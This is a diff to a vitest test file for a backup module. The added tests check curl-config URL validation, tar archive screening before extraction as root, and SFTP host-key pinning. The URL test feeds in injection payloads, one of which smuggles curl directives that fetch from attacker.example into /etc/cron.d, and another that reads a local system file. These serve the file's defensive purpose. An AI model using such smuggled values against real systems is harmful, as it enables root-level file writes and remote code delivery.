@@ -1,6 +1,8 @@
 import { describe, it, expect, vi } from 'vitest';
 import { runOp, createContext, OpError, catalog } from '../src/lib.js';
-import { parseTarListing, foldChildren, archiveTop, archiveUser, buildArchiveName, freeArchiveName, tarExcludeArgs, parseCpUserFile, cpmoveMetadata, unsafeMembers, grantDatabase, signS3, s3Target, parseS3Listing, remoteUrl, destinationConfig, createDatabaseStatement } from '../src/ops/backup.js';
+import fs from 'node:fs';
+import path from 'node:path';
+import { parseTarListing, foldChildren, archiveTop, archiveUser, buildArchiveName, freeArchiveName, tarExcludeArgs, parseCpUserFile, cpmoveMetadata, unsafeMembers, grantDatabase, signS3, s3Target, parseS3Listing, remoteUrl, destinationConfig, createDatabaseStatement, parseCurlVersion, curlPinsHostKey, matchHostKeyLines, resetCurlVersionCache } from '../src/ops/backup.js';
 
 // exec is spied with the real implementation behind it so tests can prove an op
 // refused before any program ran. No test here archives, extracts, imports or
@@ -10,7 +12,7 @@ vi.mock('../src/exec.js', async (importOriginal) => {
   const mod = await importOriginal();
   return { ...mod, exec: vi.fn(mod.exec), hasBinary: vi.fn(mod.hasBinary) };
 });
-const { exec, hasBinary } = await import('../src/exec.js');
+const { exec, hasBinary, resolveBinary } = await import('../src/exec.js');
 
 const ctx = createContext();
 const ARCHIVE = '/backup/backup-10.26.2026_02-00-00_alice.tar.gz';
@@ -312,5 +314,161 @@ describe('pure helpers', () => {
     expect(remoteUrl({ kind: 'sftp', host: '10.0.0.5', port: 22, path: '/srv/backups' }, 'a.tar.gz')).toBe('sftp://10.0.0.5:22/srv/backups/a.tar.gz');
     expect(remoteUrl({ kind: 'sftp', host: 'h.example.com', port: 22, path: '~/backups' }, '')).toBe('sftp://h.example.com:22/~/backups/');
     expect(remoteUrl({ kind: 'webdav', url: 'https://dav.example.com/remote.php/dav/files/u/' }, 'a.tar.gz')).toBe('https://dav.example.com/remote.php/dav/files/u/a.tar.gz');
+  });
+});
+
+// GitHub's published ed25519 host key and its SHA-256 fingerprint (docs.github.com).
+const ED25519_KEY = 'AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl';
+const ED25519_FP = '+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU';
+
+describe('destination URLs are single-line literals in the curl config', () => {
+  it('rejects URLs with newlines, quotes, backslashes or control characters for webdav and s3 endpoints', async () => {
+    exec.mockClear();
+    const bad = ['https://dav.example.com/b\noutput = /etc/cron.d/whm\nurl = https://attacker.example/cron', 'https://dav.example.com/b\toutput=/x', 'https://dav.example.com/b"\nurl = "file:///etc/hostname', 'https://dav.example.com/a\\b', "https://dav.example.com/it's", 'https://dav.example.com/x\x01y', 'https://dav.example.com/x y'];
+    for (const url of bad) {
+      expect(destinationConfig.safeParse({ kind: 'webdav', url }).success, JSON.stringify(url)).toBe(false);
+      expect(destinationConfig.safeParse({ kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', endpoint: url }).success, JSON.stringify(url)).toBe(false);
+      expect((await opError(runOp('backup.destination.test', { config: { kind: 'webdav', url } }, ctx))).code, JSON.stringify(url)).toBe('invalid_args');
+    }
+    expect(exec).not.toHaveBeenCalled();
+    expect(destinationConfig.safeParse({ kind: 'webdav', url: 'https://dav.example.com/remote.php/dav/files/u/?x=1&y=%20' }).success).toBe(true);
+    expect(destinationConfig.safeParse({ kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', endpoint: 'http://minio.local:9000' }).success).toBe(true);
+  });
+});
+
+describe('backup.archive.extract screens untrusted archives before tar runs as root', () => {
+  fs.mkdirSync('/tmp/whm', { recursive: true, mode: 0o700 });
+  const dir = fs.mkdtempSync('/tmp/whm/test-extract-');
+  const archive = path.join(dir, 'backup-10.26.2026_02-00-00_alice.tar.gz');
+  fs.writeFileSync(archive, '');
+  const dest = path.join(dir, '.restore-1');
+  const tarCalls = () => exec.mock.calls.filter(([bin]) => bin === 'tar');
+
+  it('refuses device nodes, absolute names and ".." members in the control parts without extracting', async () => {
+    exec.mockClear();
+    exec.mockImplementation(async (bin, argv) => {
+      if (bin === 'tar' && argv[0] === '--list') return { code: 0, stdout: ['drwx------ root/root 0 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/', 'crw-rw-rw- root/root 1,3 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/dev', '-rwsr-xr-x root/root 10 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/mysql/x'].join('\n'), stderr: '', bin, argv };
+      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
+    });
+    try {
+      const err = await opError(runOp('backup.archive.extract', { archive, dest }, ctx));
+      expect(err.code).toBe('invalid_archive');
+      expect(err.message).toMatch(/meta\/dev \(device node\)/);
+      expect(tarCalls()).toHaveLength(1);
+      expect(tarCalls()[0][1].slice(0, 3)).toEqual(['--list', '--verbose', '--absolute-names']);
+      expect(fs.existsSync(dest)).toBe(false);
+    } finally { exec.mockRestore(); }
+  });
+
+  it('extracts a clean archive with --no-same-permissions so archived setuid bits are not recreated', async () => {
+    exec.mockClear();
+    exec.mockImplementation(async (bin, argv) => {
+      if (bin === 'tar' && argv[0] === '--list') return { code: 0, stdout: 'drwx------ root/root 0 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/\n-rw------- root/root 2 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/info.json\n', stderr: '', bin, argv };
+      if (bin === 'tar' && argv[0] === '--extract') return { code: 0, stdout: '', stderr: '', bin, argv };
+      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
+    });
+    try {
+      const out = await runOp('backup.archive.extract', { archive, dest }, ctx);
+      expect(out.stagingDir).toBe(dest);
+      const extract = tarCalls().find(([, argv]) => argv[0] === '--extract')[1];
+      expect(extract).toContain('--no-same-permissions');
+      expect(extract).toContain('--no-same-owner');
+      expect(extract).not.toContain('--preserve-permissions');
+    } finally { exec.mockRestore(); fs.rmSync(dir, { recursive: true, force: true }); }
+  });
+});
+
+describe('SFTP host key pinning on curl without --hostpubsha256', () => {
+  const sftp = { kind: 'sftp', host: 'sftp.example.com', port: 2222, username: 'u', password: 'p', hostKeySha256: ED25519_FP };
+  const keyscan = `# sftp.example.com:2222 SSH-2.0-OpenSSH_8.7\n[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}\n[sftp.example.com]:2222 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0\n`;
+
+  function mockHost({ version, keyscanAvailable = true }) {
+    const curlCalls = [];
+    hasBinary.mockImplementation((name) => (name === 'curl' ? true : name === 'ssh-keyscan' ? keyscanAvailable : Boolean(resolveBinary(name))));
+    exec.mockImplementation(async (bin, argv, opts = {}) => {
+      if (bin === 'curl' && argv[0] === '--version') return { code: 0, stdout: `curl ${version} (x86_64-redhat-linux-gnu) libcurl/${version} OpenSSL/3.0.7 libssh/0.10.4/openssl/zlib\n`, stderr: '', bin, argv };
+      if (bin === 'ssh-keyscan') return { code: 0, stdout: keyscan, stderr: '# sftp.example.com:2222 SSH-2.0-OpenSSH_8.7\n', bin, argv };
+      if (bin === 'curl' && argv[0] === '-K') {
+        const home = opts.env?.HOME ?? null;
+        let knownHosts = null;
+        try { knownHosts = fs.readFileSync(path.join(home, '.ssh', 'known_hosts'), 'utf8'); } catch { /* no private HOME */ }
+        curlCalls.push({ cnf: fs.readFileSync(argv[1], 'utf8'), home, knownHosts });
+        return { code: 0, stdout: '', stderr: '', bin, argv };
+      }
+      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
+    });
+    return curlCalls;
+  }
+  const restore = () => { exec.mockRestore(); hasBinary.mockRestore(); resetCurlVersionCache(); };
+
+  it('parses curl versions and knows which ones pin a host key themselves', () => {
+    expect(parseCurlVersion('curl 7.76.1 (x86_64-redhat-linux-gnu) libcurl/7.76.1 OpenSSL/3.0.7')).toEqual({ major: 7, minor: 76 });
+    expect(parseCurlVersion('curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0')).toEqual({ major: 8, minor: 5 });
+    expect(parseCurlVersion('garbage')).toBeNull();
+    expect(curlPinsHostKey({ major: 7, minor: 76 })).toBe(false);
+    expect(curlPinsHostKey({ major: 7, minor: 80 })).toBe(true);
+    expect(curlPinsHostKey({ major: 8, minor: 5 })).toBe(true);
+    expect(curlPinsHostKey(null)).toBe(false);
+  });
+
+  it('computes OpenSSH SHA-256 fingerprints from ssh-keyscan output and keeps only the pinned key', () => {
+    expect(matchHostKeyLines(keyscan, ED25519_FP)).toEqual({ matched: [`[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}`], offered: [`ssh-ed25519 SHA256:${ED25519_FP}`, 'ssh-rsa SHA256:wCMjzvbInnSbJ3VExMnOmEIIhhGoPI5YapeggpbXrdQ'] });
+    expect(matchHostKeyLines(keyscan, `${ED25519_FP}=`).matched).toHaveLength(1);
+    expect(matchHostKeyLines(keyscan, 'A'.repeat(43)).matched).toEqual([]);
+    expect(matchHostKeyLines('', ED25519_FP)).toEqual({ matched: [], offered: [] });
+  });
+
+  it('on curl < 7.80 verifies the key with ssh-keyscan and hands curl a private known_hosts instead of hostpubsha256', async () => {
+    exec.mockClear();
+    const curlCalls = mockHost({ version: '7.76.1' });
+    try {
+      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
+      expect(out.ok, out.message).toBe(true);
+      const scan = exec.mock.calls.find(([bin]) => bin === 'ssh-keyscan');
+      expect(scan[1]).toEqual(['-p', '2222', '-T', '15', '--', 'sftp.example.com']);
+      expect(curlCalls.length).toBeGreaterThanOrEqual(1);
+      for (const call of curlCalls) {
+        expect(call.cnf).not.toMatch(/hostpubsha256|insecure/);
+        expect(call.home).toMatch(/^\/tmp\/whm\/backup-sshhome-/);
+        expect(call.knownHosts).toBe(`[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}\n`);
+        expect(fs.existsSync(call.home)).toBe(false);
+      }
+    } finally { restore(); }
+  });
+
+  it('on curl < 7.80 a key that does not match the pin, or a missing ssh-keyscan, fails before curl connects', async () => {
+    exec.mockClear();
+    let curlCalls = mockHost({ version: '7.76.1' });
+    try {
+      const out = await runOp('backup.destination.test', { config: { ...sftp, hostKeySha256: 'A'.repeat(43) } }, ctx);
+      expect(out).toMatchObject({ ok: false, code: 'destination_failed' });
+      expect(out.message).toMatch(/does not match the pinned fingerprint/);
+      expect(out.message).toContain(`ssh-ed25519 SHA256:${ED25519_FP}`);
+      expect(curlCalls).toEqual([]);
+    } finally { restore(); }
+    exec.mockClear();
+    curlCalls = mockHost({ version: '7.76.1', keyscanAvailable: false });
+    try {
+      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
+      expect(out).toMatchObject({ ok: false, code: 'destination_failed' });
+      expect(out.message).toMatch(/install ssh-keyscan/);
+      expect(curlCalls).toEqual([]);
+      expect(exec.mock.calls.some(([bin]) => bin === 'ssh-keyscan')).toBe(false);
+    } finally { restore(); }
+  });
+
+  it('on curl >= 7.80 keeps hostpubsha256 in the config and never runs ssh-keyscan', async () => {
+    exec.mockClear();
+    const curlCalls = mockHost({ version: '8.5.0' });
+    try {
+      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
+      expect(out.ok, out.message).toBe(true);
+      expect(exec.mock.calls.some(([bin]) => bin === 'ssh-keyscan')).toBe(false);
+      expect(curlCalls.length).toBeGreaterThanOrEqual(1);
+      for (const call of curlCalls) {
+        expect(call.cnf).toContain(`hostpubsha256 = "${ED25519_FP}"`);
+        expect(call.home).toBeNull();
+      }
+    } finally { restore(); }
   });
 });
